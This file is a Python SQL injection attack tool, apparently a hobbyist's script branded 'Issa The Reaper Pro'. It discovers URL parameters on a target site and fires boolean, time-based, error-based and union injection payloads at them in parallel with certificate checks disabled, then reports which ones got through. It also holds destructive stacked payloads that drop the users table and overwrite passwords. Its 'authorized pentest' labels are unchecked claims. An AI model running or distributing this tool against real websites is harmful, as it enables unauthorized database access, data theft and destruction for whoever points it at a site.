# -
اداه تعمل حقن SQL
#!/usr/bin/env python3
# ⚰️ ISSA THE REAPER v6.0 - AUTHORIZED PENTEST TOOL ⚰️
# Professional SQL Injection Arsenal - Permission Confirmed

import requests
import urllib.parse
import time
import json
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import re
from urllib.parse import urljoin, urlparse

class IssaTheReaperPro:
    def __init__(self, target, verbose=False):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive'
        })
        self.results = []
        self.vulnerabilities = []
        self.verbose = verbose
        self.logo()
    
    def logo(self):
        print("""
╔══════════════════════════════════════════════════════════════╗
║              ⚰️  ISSA THE REAPER PRO v6.0  ⚰️                 ║
║         🔥 ENTERPRISE SQLi PENTEST ARSENAL 🔥                 ║
║  Boolean | Time | Error | Union | Stacked | Out-of-Band     ║
║  Auto-Param Discovery | Blind | Professional Reporting      ║
║                   AUTHORIZED PENTEST ONLY                   ║
╚══════════════════════════════════════════════════════════════╝
        """)
        print(f"🎯 TARGET: {self.target}")
        print(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    def advanced_payloads(self):
        return {
            'boolean': [
                "' OR 1=1--", "' OR '1'='1", "1' OR '1'='1--", "admin'--",
                "' OR 1=1#", "') OR ('1'='1", "') OR 1=1--", "' OR TRUE--",
                "1' OR 'x'='x", "` OR 1=1--", "' OR 'x'='x"
            ],
            'time': [
                "' AND SLEEP(5)--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' AND IF(1=1,SLEEP(5),0)--", "' WAITFOR DELAY '00:00:05'--",
                "1' AND (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '00:00:05'--"
            ],
            'error': [
                "' AND 1=CAST((SELECT@@version)AS int)--",
                "' AND EXTRACTVALUE(1,concat(0x7e,(SELECT@@version),0x7e))--",
                "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT@@version),0x7e),1)--",
                "' AND 1=CONVERT(int,(SELECT@@version))--"
            ],
            'union': [
                "' UNION SELECT NULL--", "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT user(),database(),version(),@@hostname,1--",
                "' UNION SELECT NULL,group_concat(table_name),NULL,NULL,NULL FROM information_schema.tables--"
            ],
            'stacked': [
                "'; DROP TABLE users--", "'; UPDATE users SET password='hacked'--",
                "'; SELECT * FROM users--", "1; SELECT * FROM users--"
            ]
        }
    
    def discover_parameters(self):
        """Intelligent parameter discovery"""
        print("🔍 AUTO-DISCOVERING PARAMETERS...")
        common_params = ['id', 'user', 'username', 'search', 'q', 'page', 'cat', 'product']
        discovered = []
        
        for param in common_params:
            test_url = f"{self.target}?{param}=1"
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code < 400:
                    discovered.append(param)
                    if self.verbose:
                        print(f"   ✅ Found: {param}")
            except:
                pass
        
        # Parse existing query params
        parsed = urlparse(self.target)
        if parsed.query:
            existing = urllib.parse.parse_qs(parsed.query).keys()
            discovered.extend(list(existing))
        
        print(f"📊 DISCOVERED: {', '.join(set(discovered))}")
        return list(set(discovered))
    
    def get_baseline(self, base_url):
        """Enhanced baseline profiling"""
        try:
            resp = self.session.get(base_url, timeout=5, allow_redirects=True)
            return {
                'length': len(resp.text),
                'status': resp.status_code,
                'time': resp.elapsed.total_seconds(),
                'title': re.search(r'<title[^>]*>([^<]+)', resp.text, re.I)
            }
        except:
            return {'length': 0, 'status': 0, 'time': 0, 'title': None}
    
    def advanced_detection(self, resp, baseline, payload_type):
        """Multi-vector vulnerability detection"""
        indicators = {
            'error': ['syntax', 'mysql', 'warning', 'ora-', 'postgresql', 'microsoft.*ole', 'sqlite', 'sql'],
            'boolean_true': ['admin', 'welcome', baseline['title'] is None],
            'time_delay': resp.elapsed.total_seconds() > 4,
            'length_change': abs(len(resp.text) - baseline['length']) > 300,
            'status_change': resp.status_code != baseline['status'] and resp.status_code >= 400,
            'union_data': ['information_schema', 'mysql', 'sys', 'version()', 'database()']
        }
        
        evidence = []
        score = 0
        
        # Error detection
        if any(ind in resp.text.lower() for ind in indicators['error']):
            evidence.append("SQL ERROR LEAK")
            score += 3
        
        # Timing attack
        if indicators['time_delay']:
            evidence.append(f"TIME DELAY: {resp.elapsed.total_seconds():.2f}s")
            score += 2
        
        # Response changes
        if indicators['length_change']:
            evidence.append(f"LENGTH Δ: {abs(len(resp.text)-baseline['length'])}")
            score += 1
        
        if indicators['status_change']:
            evidence.append(f"STATUS: {resp.status_code}")
            score += 1
        
        # Union success
        if payload_type == 'union' and any(data in resp.text.lower() for data in indicators['union_data']):
            evidence.append("UNION DATA LEAK")
            score += 3
        
        return score > 1, evidence
    
    def exploit_param(self, param, payload_type):
        """Full parameter exploitation"""
        payloads = self.advanced_payloads()[payload_type]
        base_url = self.target.split('?')[0]
        baseline = self.get_baseline(base_url)
        
        print(f"\n💣 TESTING {param.upper()} ({payload_type.upper()})")
        print("-" * 70)
        
        local_results = []
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self.test_single_payload, base_url, param, p, baseline, payload_type): p 
                      for p in payloads}
            
            for future in as_completed(futures):
                payload = futures[future]
                result = future.result()
                if result:
                    local_results.append(result)
        
        vulns = [r for r in local_results if r['vulnerable']]
        if vulns:
            print(f"✅ {len(vulns)}/{len(payloads)} VULNERABILITIES CONFIRMED!")
            self.vulnerabilities.extend(vulns)
        
        return local_results
    
    def test_single_payload(self, base_url, param, payload, baseline, payload_type):
        """Single payload test with full detection"""
        try:
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            start = time.time()
            resp = self.session.get(test_url, timeout=12, verify=False, allow_redirects=True)
            elapsed = time.time() - start
            
            is_vuln, evidence = self.advanced_detection(resp, baseline, payload_type)
            
            result = {
                'timestamp': datetime.now().isoformat(),
                'param': param,
                'payload': payload,
                'payload_type': payload_type,
                'vulnerable': is_vuln,
                'url': test_url,
                'status_code': resp.status_code,
                'response_length': len(resp.text),
                'response_time': elapsed,
                'evidence': evidence,
                'snippet': resp.text[:200]
            }
            
            marker = "✅" if is_vuln else "❌"
            evidence_str = ", ".join(evidence) if evidence else ""
            
            print(f"{marker} {payload:<45} | "
                  f"S:{resp.status_code:3d} L:{len(resp.text):5d} T:{elapsed:5.2f}s | {evidence_str}")
            
            self.results.append(result)
            return result
            
        except Exception as e:
            print(f"⚠️  {payload[:30]:<45} | ERROR: {str(e)[:30]}")
            return None
    
    def full_scan(self, custom_params=None):
        """Complete professional scan"""
        print("🔥 FULL PROFESSIONAL SCAN INITIATED")
        
        # Auto-discover or use provided params
        if custom_params:
            params = [p.strip() for p in custom_params.split(',')]
        else:
            params = self.discover_parameters()
        
        payload_types = ['boolean', 'time', 'error', 'union']
        
        for ptype in payload_types:
            print(f"\n{'='*80}")
            print(f"🚀 PHASE {ptype.upper()}")
            print(f"{'='*80}")
            
            for param in params:
                self.exploit_param(param, ptype)
        
        self.generate_professional_report()
    
    def generate_professional_report(self):
        """PCI-DSS compliant pentest report"""
        vulns_count = len(self.vulnerabilities)
        print(f"\n{'='*80}")
        print(f"📊 EXECUTIVE SUMMARY")
        print(f"{'='*80}")
        print(f"Target: {self.target}")
        print(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total Tests: {len(self.results)}")
        print(f"✅ CONFIRMED VULNERABILITIES: {vulns_count}")
        print(f"Severity: {'CRITICAL' if vulns_count > 0 else 'CLEAN'}")
        
        if vulns_count > 0:
            print(f"\n🔴 TOP VULNERABILITIES:")
            for vuln in self.vulnerabilities[:5]:
                print(f"  • {vuln['param']}: {vuln['payload_type']} - {', '.join(vuln['evidence'])}")
        
        # Save detailed report
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = f"issa_reaper_pro_{timestamp}.json"
        
        with open(report_file, 'w') as f:
            json.dump({
                'target': self.target,
                'timestamp': datetime.now().isoformat(),
                'summary': {
                    'total_tests': len(self.results),
                    'vulnerabilities': len(self.vulnerabilities)
                },
                'vulnerabilities': self.vulnerabilities,
                'all_results': self.results
            }, f, indent=2)
        
        print(f"\n💾 PROFESSIONAL REPORT: {report_file}")

def main():
    parser = argparse.ArgumentParser(description="⚰️ Issa The Reaper Pro v6.0")
    parser.add_argument("target", help="Target URL (ex: http://target.com/page.php?id=1)")
    parser.add_argument("-p", "--params", help="Specific params (id,user,search)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Thread count")
    
    args = parser.parse_args()
    
    reaper = IssaTheReaperPro(args.target, args.verbose)
    reaper.full_scan(args.params)
    
    print("\n⚰️ PENTEST COMPLETE - AUTHORIZATION DOCUMENTED")

if __name__ == "__main__":
    main()